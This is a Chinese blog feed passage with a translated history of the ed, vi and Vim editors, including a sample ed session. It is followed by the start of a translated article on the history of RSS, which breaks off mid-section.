<p>1966 年，贝尔实验室雇佣了 Ken Thompson。Thompson 刚在加州大学伯克利分校完成了电子工程与计算机科学方向的硕士学位。在那里，他用过一个名为 QED 的文本编辑器，这个编辑器在 1965 年与 1966 年之间为伯克利分时系统而写。<sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup> Thompson 在到达贝尔实验室后的头等要事便是为 MIT 相容分时系统重写了 QED。后来他会为了 Multics 计划而编写另一个版本的 QED。期间，他扩展了程序以使得用户能够在一个文件中搜索行，并使用正则表达式进行替换。<sup id="fnref:2"><a href="#fn:2" class="footnote-ref" role="doc-noteref">2</a></sup></p>
<p>Multics 计划，与伯克利分时系统相似，寻求于创造一个商业上可行的分时操作系统，是 MIT，通用电气及贝尔实验室间的合作产物。AT&amp;T 最终认定这个计划没有进展并选择退出。Thompson 与他的同事——贝尔实验室研究员 Dennis Ritchie，现在没有了分时系统，失去了系统所提供的“交互式计算的感觉”，便开始着手制作他们自己的版本——最终会闻名为 Unix。<sup id="fnref:3"><a href="#fn:3" class="footnote-ref" role="doc-noteref">3</a></sup> 1969 年八月，在他的妻子与儿子在加利福尼亚度假时，Thompson 将新系统的基本组件组合在了一起，分别分配了“一个星期给操作系统、shell、编辑器、及汇编器。”<sup id="fnref:4"><a href="#fn:4" class="footnote-ref" role="doc-noteref">4</a></sup></p>
<p>这个编辑器会被叫做 <code>ed</code>。它基于 QED 但并不是一个确切的重实现。Thompson 决定抛弃一些 QED 功能。正则表达式的支持被削减，所以只有相对简单的正则表达式才会被理解。QED 通过打开多个缓冲区允许用户同时编辑几个文件，但 <code>ed</code> 一次只能对一个缓冲区工作。尽管 QED 能执行一个包含命令的缓冲区，<code>ed</code> 却不能这么做。这些简化也许是被要求的。Dennis Ritchie 曾说没有 QED 的高级正则表达式是“不大的损失”。<sup id="fnref:5"><a href="#fn:5" class="footnote-ref" role="doc-noteref">5</a></sup></p>
<p><code>ed</code> 现在是 POSIX 标准的一部分，所以如果你有一个 POSIX 兼容的系统，它已经安装在你的电脑上了。它值得一玩，因为 <code>ed</code> 的许多命令现在是 Vim 的一部分。例如，为了将缓冲区写入磁盘，你需要使用 <code>w</code> 命令。为了退出编辑器，你需要使用 <code>q</code> 命令。这两个命令能在一行中同时被指定——也就是 <code>wq</code>。正如同 Vim，<code>ed</code> 是一个模式编辑器；为了从命令模式进入输入模式你需要使用插入命令(<code>i</code>)，附加命令(<code>a</code>)，或是更改命令(<code>c</code>)，这取决于你想对文本做些什么。<code>ed</code> 同样引进了 <code>s/foo/bar/g</code> 格式来查找与替换，或称“取代”文本。</p>
<p>鉴于这些相似之处，你可能会认为普通的 Vim 用户使用 <code>ed</code> 没有任何问题。但在另一个重要的方面，<code>ed</code> 与 Vim 不尽相同。<code>ed</code> 是一个真正的行编辑器。它在电传打字机时代被写下并被广泛使用。当 Ken Thompson 与 Dennis Ritchie 正忙碌于 Unix 时，他们看起来像是这样：</p>
<p><img src="https://s2.loli.net/2024/04/13/Yzk6CW9PntxZilM.jpg" alt="Ken_Thompson_(sitting)and_Dennis_Ritchie_at_PDP-11(2876612463).jpg"></p>
<p><code>ed</code> 不允许你在打开的缓冲区里的其他行中编辑恰当的行，或者是移动光标，因为每当你改变了文件，<code>ed</code> 会必须重印整个文件。1969 年并没有让 <code>ed</code>“清除”屏幕上内容的机制，因为屏幕其实仅仅是一张纸，输出的所有东西都已经被墨水印到了纸上。如有必要，你可以使用列出命令(<code>l</code>)让 <code>ed</code> 为你打印出一行行内容，但大多数时间你都在操控着你不能看见的文本。因此使用 <code>ed</code> 就像是在一个昏暗的房子里用着一个几乎没电的手电筒，尝试着找对路。你一次能看到如此多东西，所以你必须尽你所能来记住一切都在哪里。</p>
<p>下面是一个 <code>ed</code> 会话的例子。我已经添加了注释（在 <code>#</code> 标记之后）来解释每行的用途，尽管 <code>ed</code> 并不会将输入的这些识别为注释且会报错：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">[</span>sinclairtarget 09:49 ~<span style="color:#f92672">]</span>$ ed
</span></span><span style="display:flex;"><span>i                           <span style="color:#75715e"># 进入输入模式</span>
</span></span><span style="display:flex;"><span>Hello world!
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Isn<span style="color:#e6db74">&#39;t it a nice day?
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">.                           # 结束输入
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">1,2l                        # 列出1、2行
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Hello world!$
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">$
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">2d                          # 删除第 2 行
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">,l                          # 列出整个缓冲区
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Hello world!$
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Isn&#39;</span>t it a nice day?$
</span></span><span style="display:flex;"><span>s/nice/terrible/g           <span style="color:#75715e"># 全局替换</span>
</span></span><span style="display:flex;"><span>,l
</span></span><span style="display:flex;"><span>Hello world!$
</span></span><span style="display:flex;"><span>Isn<span style="color:#e6db74">&#39;t it a terrible day?$
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">w foo.txt                   # 写入 foo.txt
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">38                          # (写入的字节数)
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">q                           # 退出
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[sinclairtarget 10:50 ~]$ cat foo.txt
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Hello world!
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Isn&#39;</span>t it a terrible day?
</span></span></code></pre></div><p>正如你所见到的，<code>ed</code> 并不是一个特别健谈的程序。</p>
<h2 id="bill-joy-与一个文本编辑器">Bill Joy 与一个文本编辑器</h2>
<p><code>ed</code> 对 Thompson 和 Ritchie 来说完全够用。其他人则认为其难于使用，并且它成为了 Unix 对新手的敌意的一个臭名昭著的例子。<sup id="fnref:6"><a href="#fn:6" class="footnote-ref" role="doc-noteref">6</a></sup> 1975 年，一个名叫 George Coulouris 的男子在伦敦玛丽王后大学的 Unix 系统上开发了 <code>ed</code> 的一个改进版本。Coulouris 写了他的编辑器是为了利用他在伦敦玛丽王后大学能获得的显示屏。不像 <code>ed</code>，Coulouris 的程序允许用户编辑屏幕上恰当的一行，通过一下下的击键来在行间移动（想象下你一次只在一行里使用 Vim）。Coulouris 称他的程序为 <code>em</code>，或称&quot;editor for mortals（模式编辑器）&quot;，这可能是在 Thompson 造访伦敦玛丽王后大学，见了 Coulouris 所写的程序并驳斥之，称他不需要在编辑一个文件时查看它的状态之后。</p>
<p>1976 年，Coulouris 带着 <code>em</code> 到了加州大学伯克利分校，他在那里作为计算机科学系的访问者待了一整个夏天。这刚好是在 Ken Thompson 离开伯克利前往贝尔实验室的十年之后。在伯克利，Coulouris 见到了 Bill Joy，一个正在工作于伯克利软件套件(BSD)的研究生。Coulouris 给 Joy 展示了 <code>em</code>，Joy 便在 Coulouris 的源代码上开始构建 <code>ed</code> 的一个改进版本，称之为 <code>ex</code>，即&quot;extended <code>ed</code>（扩展版 <code>ed</code>）&quot;。1978 年，<code>ex</code> 的 1.1 版本与 BSD 的首个发布版本捆绑释出。<code>ex</code> 很大程度上与 <code>ed</code> 兼容，但添加了两个模式：一个“打开”模式，启用与 <code>em</code> 上相似的单行编辑；一个“可视”模式，接管整个屏幕并允许我们像今天那样实时编辑整个文件。</p>
<p>在 1979 年 BSD 的第二个发布版本中，一个名为 <code>vi</code> 的可执行程序被引进，它能比可视模式的 <code>ex</code> 做的稍多一些。</p>
<p><code>ex</code>/<code>vi</code>(自此以后便是 <code>vi</code>)确立了很多不是 <code>ed</code> 一部分但我们现在在用的大部分约定。Joy 使用的视频终端是一台 Lear Siegler ADM-3A，其键盘上没有方向键。作为替代，箭头被印在 <code>h</code>, <code>j</code>, <code>k</code> 与 <code>l</code> 键上，这便是为何 Joy 使用这些按键作为 <code>vi</code> 中的光标移动。ADM-3A 键盘上的 ESC 键则位于如今的 Tab 键的位置上，这解释了为何一个极其难按到的按键会被分配为常用到的退出一个模式的操作。使用 <code>:</code> 字符作为命令前缀也是来自 <code>vi</code>，在正常模式（也就是运行 <code>ex</code> 进入的模式）中使用 <code>:</code> 作为提示。这解决了 <code>ed</code> 中存在已久的一个抱怨，即，一旦启动，用户只会得到彻底的沉默。在可视模式，保存并退出现在是键入经典的 <code>:wq</code>。&ldquo;Yanking&rdquo; 与 &ldquo;putting&rdquo;（译注：即复制与粘贴）出现了，且 <code>set</code> 命令打开设置选项都是最初的 <code>vi</code> 的一部分。我们现在在 Vim 中使用的基本的文本编辑功能大部分都是 <code>vi</code> 的功能。</p>
<p><img src="https://s2.loli.net/2024/04/13/GnTOFa4NMpXo7di.jpg" alt="LSI-ADM3A-full-keyboard.jpg"></p>
<p><code>vi</code> 是 BSD 上除了 <code>ed</code> 唯一捆绑安装的文本编辑器。在那时，Emacs 需要花费数百美元（这是在 GNU Emacs 出现之前），所以 <code>vi</code> 变得极其流行。但 <code>vi</code> 是 <code>ed</code> 的直接后代，这意味着如果没有 AT&amp;T 的源代码许可，源代码不能被改动。这使几个人创造了 <code>vi</code> 的开源版本。1987 年 STEVIE (ST Editor for VI Enthusiasts)（为 vi 爱好者的 ST 编辑器）出现了，Elvis 出现在 1990 年，<code>nvi</code> 则在 1994 年出现。这些克隆中的某些添加了额外的功能，例如语法高亮显示与分割窗口。因为很多 Elvis 用户的推动，Elvis 的许多功能被合并进了 Vim。</p>
<h2 id="bram-moolenaar-与-vim">Bram Moolenaar 与 Vim</h2>
<p>Vim，现在是&quot;Vi Improved&quot;的缩写，最初却意味着&quot;Vi Imitation&quot;（Vi 的模仿）。如同许多其他的 <code>vi</code> 克隆，Vim 最初是一个 <code>vi</code> 不能工作的平台上的移植。Bram Moolenaar，一个在荷兰芬洛的一个复印机公司工作的荷兰工程师，想要在他全新的 Amiga 2000 上拥有一个像 <code>vi</code> 一样的东西。Moolenaar 在大学时代已习惯于在 Unix 系统上使用 <code>vi</code>，且它现在“了如指掌”。<sup id="fnref:7"><a href="#fn:7" class="footnote-ref" role="doc-noteref">7</a></sup> 所以在 1988 年，以已存在的 <code>vi</code> 克隆 STEVIE 作为起点，Moolenaar 开始着手于 Vim。</p>
<p>Moolenaar 已经有了 STEVIE，因为 STEVIE 已在一个叫 Fred Fish disk 的东西上出现了。Fred Fish 是一个美国程序员，每个月都会寄出一个软盘，其中是 Amiga 平台上可用的最好的开源软件的辑选。每个人都能要一份，只需付出邮费而已。Moolenaar 使用的版本是在 Fred Fish disk 256 上发布的版本。<sup id="fnref:8"><a href="#fn:8" class="footnote-ref" role="doc-noteref">8</a></sup>（很遗憾，看起来 Fred Fish disk 与 <a href="https://en.wikipedia.org/wiki/Freddi_Fish">Freddi Fish</a> 并没有什么关系。）</p>
<p>Moolenaar 很喜欢 STEVIE 但很快就注意到很多 <code>vi</code> 命令缺失了。<sup id="fnref:9"><a href="#fn:9" class="footnote-ref" role="doc-noteref">9</a></sup> 所以，在 Vim 的首个发布版本中，Moolenaar 将与 <code>vi</code> 的兼容作为首要工作。有人曾写了一系列的 <code>vi</code> 宏，在一个与 <code>vi</code> 正确兼容的编辑器上运行时，能解决一个 <a href="https://github.com/isaacs/.vim/tree/master/macros/maze">随机生成的迷宫</a>。Moolenaar 能使这些宏在 Vim 上工作。1991 年，Vim 在 Fred Fish disk 591 上第一次以&quot;Vi Imitation&quot;发布。<sup id="fnref:10"><a href="#fn:10" class="footnote-ref" role="doc-noteref">10</a></sup> Moolenaar 已经添加了一些功能（包括多级撤销，与对编译错误的&quot;quickfix&quot;模式），这意味着 Vim 已经超越了 <code>vi</code>。但 Vim 会保持&quot;Vi Imitation&quot;直到 1993 年通过 FTP 发布的 Vim 2.0。</p>
<p>Moolenaar 在许多网上合作者的偶尔协助下，以稳健的步伐给 Vim 添加功能。Vim 2.0 引入了 <code>wrap</code> 选项与较长行内水平滚动的支持。Vim 3.0 添加了对分割窗口与缓冲区的支持，这些功能来自 <code>vi</code> 的克隆 <code>nvi</code>。Vim 现在也能将每个缓冲区存入一个交换文件，所以已更改的文本能在崩溃中幸免于难。Vimscript 在 Vim 5.0 中首次出现，一同出现的还有对语法高亮显示的支持。在这期间，Vim 的流行程度一直在增长。它被移植到 MS-DOS, Windows, Mac, 甚至 Unix，在其上 Vim 与最初的 <code>vi</code> 相竞争。</p>
<p>2006 年，在 <em>Linux Journal</em> 读者中，Vim 被投票为最流行的编辑器。<sup id="fnref:11"><a href="#fn:11" class="footnote-ref" role="doc-noteref">11</a></sup> 如今，根据 Stack Overflow 的 2018 年开发者调查，Vim 是最流行的文本模式（即终端模拟器）编辑器，被所有软件开发者中的 25.8% 所使用（以及 40% 的系统管理员/运维）。<sup id="fnref:12"><a href="#fn:12" class="footnote-ref" role="doc-noteref">12</a></sup> 从 1980 年代末期，贯穿整个 90 年代的时间里，程序员们发起了“编辑器战争”，使 EMacs 与 <code>vi</code> （后来变成了 Vim）用户相斗争。尽管 Emacs 还有着一批追随者，一些人认为编辑器战争已经结束且 Vim 胜利了。<sup id="fnref:13"><a href="#fn:13" class="footnote-ref" role="doc-noteref">13</a></sup> 2018 年 Stack Overflow 开发者调查佐证了这一说法；只有 4.1% 的调查对象使用 Emacs。</p>
<p>Vim 是怎么变得这么成功的？很明显人们喜欢 Vim 提供的功能。但我认为 Vim 背后悠久的历史说明了它有着比之功能更多的好处。回溯 Vim 的代码库，只是到达 1988 年 Moolenaar 开始在其上工作。&ldquo;wq text editor&quot;在另一方面——一个类似 Unix 环境的文本编辑器该如何工作的宏大愿景——已走过半个世纪。&ldquo;wq text editor&rdquo; 有着几种不同的表达，但幸亏 Bill Joy 与 Bram Moolenaar 两人对兼容性不同寻常的注重，好的想法随着时间不断积累。某种意义上，&ldquo;wq text editor&rdquo; 是运行时间最长的、最成功的开源项目之一，享受着计算机世界最伟大思想的贡献。我并不认为“初创公司抛弃先例创造了制造混乱的软件”的开发方式一定很坏，但 Vim 证明了以合作与递增的方式也能创造奇迹。</p>
<div class="footnotes" role="doc-endnotes">
<hr>
<ol>
<li id="fn:1">
<p>Butler Lampson, “<a href="http://bwlampson.site/Systems.htm">Systems</a>,” Butler Lampson, accessed August 5, 2018.&#160;<a href="#fnref:1" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:2">
<p>Dennis Ritchie, “<a href="https://www.bell-labs.com/usr/dmr/www/qed.html">An Incomplete History of the QED Editor</a>,” accessed August 5, 2018.&#160;<a href="#fnref:2" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:3">
<p>Peter Salus, “<a href="http://www.groklaw.net/article.php?story=20050414215646742">The Daemon, the GNU, and the Penguin</a>,” Groklaw, April 14, 2005, accessed August 5, 2018.&#160;<a href="#fnref:3" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:4">
<p>ibid.（译注：同上）&#160;<a href="#fnref:4" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:5">
<p>Dennis Ritchie, “<a href="https://www.bell-labs.com/usr/dmr/www/qed.html">An Incomplete History of the QED Editor</a>,” accessed August 5, 2018.&#160;<a href="#fnref:5" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:6">
<p>Donald Norman, “<a href="http://www.ceri.memphis.edu/people/smalley/ESCI7205_misc_files/The_truth_about_Unix_cleaned.pdf">The Truth about Unix: The User Interface Is Horrid</a>,” Datamation, accessed August 5, 2018.&#160;<a href="#fnref:6" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:7">
<p>Bram Moolenaar, “<a href="https://www.youtube.com/watch?v=ayc_qpB-93o&amp;t=4m58s">Vim 25</a>” (lecture, Zurich, November 2, 2016), December 13, 2016, accessed August 5, 2018.&#160;<a href="#fnref:7" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:8">
<p>ibid（译注：同上）. (?t=6m15s)&#160;<a href="#fnref:8" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:9">
<p>ibid（译注：同上）. (?t=7m6s)&#160;<a href="#fnref:9" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:10">
<p>“<a href="http://www.amiga-stuff.com/pd/fish.html">Fish Disks 1 - 1120</a>,” Amiga Stuff, accessed August 5, 2018.&#160;<a href="#fnref:10" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:11">
<p>“<a href="https://www.linuxjournal.com/article/8520#N0x850cd80.0x87983bc">2005 Linux Journal Reader’s Choice Awards</a>,” Linux Journal, September 28, 2005, accessed August 5, 2018.&#160;<a href="#fnref:11" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:12">
<p>“<a href="https://insights.stackoverflow.com/survey/2018/#development-environments-and-tools">Stack Overflow Developer Survey 2018</a>,” Stack Overflow, accessed August 5, 2018.&#160;<a href="#fnref:12" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:13">
<p>Bruce Byfield, “<a href="http://www.linux-magazine.com/Online/Blogs/Off-the-Beat-Bruce-Byfield-s-Blog/The-End-of-the-Editor-Wars">The End of the Editor Wars</a>,” Linux Magazine, May 11, 2015, accessed August 5, 2018.&#160;<a href="#fnref:13" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
</ol>
</div>
]]></content><category scheme="https://blog.batkiz.com/tags/vim" term="vim" label="vim"/><category scheme="https://blog.batkiz.com/tags/linux" term="linux" label="linux"/></entry><entry><title type="html">翻译 | RSS 的兴起与衰落</title><link href="https://blog.batkiz.com/posts/translation-the-rise-and-demise-of-rss/?utm_source=atom_feed" rel="alternate" type="text/html"/><link href="https://blog.batkiz.com/posts/rss-is-best/?utm_source=atom_feed" rel="related" type="text/html" title="RSS，今日头条与信息爆炸"/><id>https://blog.batkiz.com/posts/translation-the-rise-and-demise-of-rss/</id><published>2018-10-09T14:58:44+00:00</published><updated>2018-10-09T14:58:44+00:00</updated><content type="html"><![CDATA[<p>2025.7.5 补：<a href="/posts/ai-translation-the-rise-and-demise-of-rss/">借助 AI 能力翻译的新版本</a></p>
<hr>
<p>原文：<a href="https://twobithistory.org/2018/09/16/the-rise-and-demise-of-rss.html">The Rise and Demise of RSS</a></p>
<p>翻译：<a href="https://github.com/batkiz">batkiz</a>，校对：<a href="https://github.com/ruinsyi">RUInsYi</a></p>
<p>这有两个故事。第一个故事是关于一个从未完全实现的对互联网未来的愿景。第二个故事，则讲述了改善一个流行标准的合作是如何演变为开源软件发展史上最富争议的问题之一。</p>
<p>90 年代末，在那个网景公司 IPO 与互联网泡沫崩溃间的狂热年代，每个人都能预见到互联网行将变成更为庞大的产业，尽管没人确切知道它是如何如何做到的。一种观点认为 <strong>信息聚合</strong> 将席卷整个互联网产业。最初为了使两端——服务端，与从服务端抓取文档的客户端——间的简单交流成为可能而建立的互联网，将因一种在一系列频道中重新打包并分发所有网站的新标准而蜕变。Kevin Werbach，<em>Release 1.0</em>，90 年代一封在投资者中影响深远的通讯的作者，曾预测信息聚合“会演化为互联网生态的核心模式，在允许企业和个人享受大规模、大范围的益处同时，保留对他们网络形象的控制。”<sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup> 他邀请他的读者一同想象这样的未来，剑术迷能够直接在他们最爱的网站上通过嵌入其中的网购插件买一把新的重剑，而非直接去“在线运动品商店”或“击剑设备零售商”。<sup id="fnref:2"><a href="#fn:2" class="footnote-ref" role="doc-noteref">2</a></sup> 就如同电视世界中，大的网络提供商能够将他们的节目聚合到一个较小的地方电视台，网络上的信息聚合能使销售商和出版商通过大量的中间站点接触到消费者。这意味着，作为结论，消费者会在与销售商和出版商互动上，拥有天时地利人和的选择权。</p>
<p>RSS 是承诺提供这样的聚合化未来的标准之一。对于 Werbach，RSS 是“轻量级聚合协议的领先范例。”<sup id="fnref:3"><a href="#fn:3" class="footnote-ref" role="doc-noteref">3</a></sup> 另一篇同期文章将 RSS 称为第一个意识到 XML 的潜力的协议。<sup id="fnref:4"><a href="#fn:4" class="footnote-ref" role="doc-noteref">4</a></sup> 它正成为使用户与内容整合者能够从必须提供一切信息的网站中创造个性化定制的频道的一种方式。而现在，二十年后，RSS <a href="https://trends.google.com/trends/explore?date=all&amp;geo=US&amp;q=rss">像是成为了一种将死的技术</a>，仅仅主要被播客与程序员们的科技博客使用。此外，在后来的群体中，比起实际效用，RSS 可能更主要因其政治上的象征意义而被使用。尽管有些人确实有 RSS 读者，并顽固地为博客加入 RSS 服务，这在 2018 年也是一种十分保守的表态。那个小小的橘子泡（译注：指 RSS 标志）已然成为一个象征着对与 Werbach 的想象中的聚合网络一点也不像的巨头垄断式中心化网络的反抗标志。</p>
<p>RSS 的未来曾是如此光明。那到底是发生了什么呢？难道它的衰落是不可避免的？还是它在一个单一 RSS 标准的发展中因内斗而落没？</p>
<h2 id="浑水">浑水</h2>
<p>RSS 曾两度被发明。这意味着，它从未有过一个明白无误的拥有者，一系列的事务又催生了无止境的争吵与辩论。但这也同时表明，作为一个重要想法， RSS 的时代已经到来。</p>
<p>1998 年，网景正竭力想象自己的未来。它的旗舰产品，曾一度被 80% 的互联网用户所选择的网景浏览器，正在 IE 浏览器前迅速失去份额。所以网景决定在一个全新的领域竞争。五月份，一个小组被组建起来，开始了后来被内部称为“Project 60”的项目。<sup id="fnref:5"><a href="#fn:5" class="footnote-ref" role="doc-noteref">5</a></sup> 两个月后，网景宣布了“My Netscape”，一个与其他互联网门户如雅虎，MSN 及 Excite 相竞争的互联网门户。</p>
<p>第二年三月，网景宣布了一个叫&quot;My Netscape Network&quot;的 My Netscape 门户扩展。My Netscape 用户现在可以自定义他们的 My Netscape 页面所以它包含了名为“channels&quot;的功能，汇集网络上最近的头条新闻。只要你最爱的网站发布了一个由网景规定格式的特殊文件，一般只需点击网站在其界面提供的“Add Channel”按键，你就能把这个网站添加到你的 My Netscape 页面。如此，一个包含着一列相关头条的小盒子就会出现。</p>
<p><img src="https://s1.ax1x.com/2018/09/22/iupTPJ.gif" alt="mnn-channel"></p>
<p>这个参与网站必须发布的特殊文件就是一个 RSS 文件。在 My Netscape Network 的声明中，网景解释称 RSS 代表着”RDF Site Summary“。<sup id="fnref:6"><a href="#fn:6" class="footnote-ref" role="doc-noteref">6</a></sup> 这多少有几分用词不当。RDF，全称 Resource Description Framework，主要是一个描述各种资源属性的语法（如果感兴趣的话，看 <a href="https://twobithistory.org/2018/05/27/semantic-web.html">我的关于语义网的这篇文章</a>。1999 年，W3C 组织开始考虑 RDF 的规范草案。尽管 RSS 应该是基于 RDF 的，网景释出的示例 RSS 文件却没有用任何 RDF 标签，即使它声明了 RDF XML 命名空间。在一份与网景 RSS 规范一同释出的文件中，规范作者之一的 Dan Libby 解释称“在 MNN 的发布中，网景曾有意的限制了 RSS 格式的复杂性”。<sup id="fnref:7"><a href="#fn:7" class="footnote-ref" role="doc-noteref">7</a></sup> 这份规范的版本号是 0.90，因为他们相信在 W3C 的 XML 规范与新的 RDF 标准下，RSS 接下来的版本会更加完善。</p>
<p>RSS 曾被 Libby 与 Ramanathan Guha，另一个网景雇员一同定义。Guha 之前在苹果公司工作，并在那里提出了 Meta Content Framework。MCF 是一个意图描述从网页到本地文件等一切的表示元数据格式。Guha 为证明其力量，开发了一个名为 <a href="http://web.archive.org/web/19970703020212/http://mcf.research.apple.com:80/hs/screen_shot.html">HotSauce</a> 的程序，能在 3D 空间中以节点网络的形式可视化显示文件间关系。在离开苹果加入网景后，Guha 与 Tim Bray，一个网景顾问，一同为制作一个基于 XML 版本的 MCF 而工作，而这成为了 W3C 的 RDF 草案的基础。<sup id="fnref:8"><a href="#fn:8" class="footnote-ref" role="doc-noteref">8</a></sup> 之后，不出意外的，Guha 与 Libby 急于将 RDF 合并进 RSS。但 Libby 后来写道，由于时间限制及 RDF “对于‘一般用户’太‘过于复杂’”，基于 RDF 的 RSS 比之最初的设想，削减了很多。<sup id="fnref:9"><a href="#fn:9" class="footnote-ref" role="doc-noteref">9</a></sup></p>
<p>正当网景努力在后来被称为“门户大战”的竞争中夺人眼球时，一种闻名为“博客”的现象正在互联网的其他地方悄然登场。<sup id="fnref:10"><a href="#fn:10" class="footnote-ref" role="doc-noteref">10</a></sup> Dave Winery 正是那些先驱者之一，他是一家叫 UserLand Software 的公司的 CEO，这家公司开发了早期的内容管理系统，能让非技术娴熟的人更容易地书写博客。Winer 经营着他名为 <a href="http://scripting.com/">Scripting News</a> 的个人博客，这也是网上现存的最古老的博客之一。在 1997 年的 12 月 15 日，网景宣布 My Netscape Network 一年多以前，Winer 发布了一篇文章宣布博客现在已能通过 XML 与 HTML 一同获得。<sup id="fnref:11"><a href="#fn:11" class="footnote-ref" role="doc-noteref">11</a></sup></p>
<p>Dave Winer 的 XML 格式闻名为 Scripting News 格式。它可能与微软的 Channel Definition 格式（一个在 1997 年 3 月提交给 W3C 的“推送技术”标准）相似，但我并不能找到一个原始格式的文件来验证这个说法。[^12] 如同网景的 RSS，它组织了 Winer 的博客内容以便于其他的软件应用理解。当网景发布 RSS 0.90 时，Winer 与 UserLand Software 开始同时支持两种格式。但 Winer 相信网景的格式“极其劣质”且“失去了网络作者与读者需要的关键”。<sup id="fnref:12"><a href="#fn:12" class="footnote-ref" role="doc-noteref">12</a></sup> 它只能表现一列链接，反之，Scripting News 格式能够表现一系列的段落，每个都能包含一个或多个链接。</p>
<p>1999 年 6 月，网景宣布 My Netscape Network 两个月后，Winer 介绍了 Scripting News 格式的新版本，称为 ScriptingNews 2.0b1。Winer 声称曾尝试与网景获得联系以指出 RSS 0.90 的不足但失败了，只好决定继续完善他自己的格式。<sup id="fnref:13"><a href="#fn:13" class="footnote-ref" role="doc-noteref">13</a></sup> Scripting News 格式的新版本在 <code>&lt;header&gt;</code> 元素中加入了几个新项目以使 Scripting News 格式与 RSS 同等。但这两种格式继续与 Scripting News 格式—— Winer 昵称其为“胖”聚合格式，能够包含整个段落，而非仅仅是链接——不同。</p>
<p>网景在第二个月宣称 RSS 0.91 将会放出。这个更新的规范是一个大转变。 RSS 不再表示&quot;RDF Site Summary&quot;；它现在代表&quot;Rich Site Summary&quot;。所有的 RDF——已经几乎没有了的——被剥离。许多 Scripting News 标签被合并。在新规范的文本中，Libby 解释道：</p>
<blockquote>
<p>RDF 引用被移除了。RSS 最初被构思为一个提供网站摘要的元数据格式。两件事变得明了了：第一个是提供者更想要一个聚合格式而非元数据格式。RDF 文件的结构非常严格，而且符合 RDF 的数据模型为了使其有效。这并不能很容易地被人所理解，而且非常难以创建有用的 RDF 文件。第二个问题是只有很少的工具可用于 RDF 部署，验证与处理。因为上述原因，我们决定附属于一个标准的 XML 途径。<sup id="fnref:14"><a href="#fn:14" class="footnote-ref" role="doc-noteref">14</a></sup></p>
</blockquote>
<p>Winer 对 RSS 0.91 非常满意，称之“出乎意料的更好”<sup id="fnref:15"><a href="#fn:15" class="footnote-ref" role="doc-noteref">15</a></sup> UserLand Software 将其采用为已存在的 ScriptingNews 2.0b1 格式的替代。一下子，RSS 貌似终于有了一个单一的权威规范。</p>
<h2 id="大分叉">大分叉</h2>
<p>一年后，RSS 0.91 规范变得严重不充分。人们想用 RSS 处理种种标准未处理的事情。规范的另一些部分看起来则是毫无必要的约束——比如每个 RSS 频道最多只能包含 15 项。</p>
<p>在那时，RSS 已经被更多的几个组织所接受。与看起来在 RSS 0.91 后已失去兴趣的网景不同，大玩家分别是 Dave Winer 的 UserLand Software；经营着一个名为 Meerkat 的 RSS 聚合器的 OReilly Net；以及同样经营着一个专注于新闻的 RSS 聚合器的 Moreover.com。<sup id="fnref:16"><a href="#fn:16" class="footnote-ref" role="doc-noteref">16</a></sup> 通过邮件列表，这些组织的代表与其他人定期讨论如何改良 RSS 0.91。但关于如何改良的问题他们也有着深远的分歧。</p>
<p>发生最多讨论的邮件列表被称为信息聚合邮件列表（译注：the Syndication mailing list，暂译）。<a href="https://groups.yahoo.com/neo/groups/syndication/info">一份信息聚合邮件列表的存档</a> 现在仍可获得。这是一份令人惊异的历史资源。它给出了那些分歧是如何最终导致 RSS 社区的政治决裂的实时说明。</p>
<p>首当其冲的一方是 Winer。Winer 对于改善 RSS 非常急躁，但他想要以相对保守的方式来改变它。在 2000 年 6 月，他在 UserLand 网站上公布了他自己的 RSS 0.91 标准，意味着 RSS 更深一层发展的起点。它对网景公布的 RSS 0.91 标准没有任何的重大改变。Winer 在一篇博文中声称伴随着他的标准的仅仅是一份必要的 RSS 如何在真实环境被使用的“清理”文档，因为网景的标准已经不再维护。<sup id="fnref:17"><a href="#fn:17" class="footnote-ref" role="doc-noteref">17</a></sup> 同一篇文章中，他认为 RSS 之所以成功，是因为它足够简单，如果将命名空间或 RDF 再添加到这个格式中——在信息聚合邮件列表中的一些人已经建议做这些事——它“会极大地复杂化，恕我直言，在内容提供者层面，提升复杂性什么都给我们带来”。几乎同时，在一则被发到信息聚合邮件列表的信息中，Winer 建议，那些问题已经足够重要，这可能使他去创建一个分支：</p>
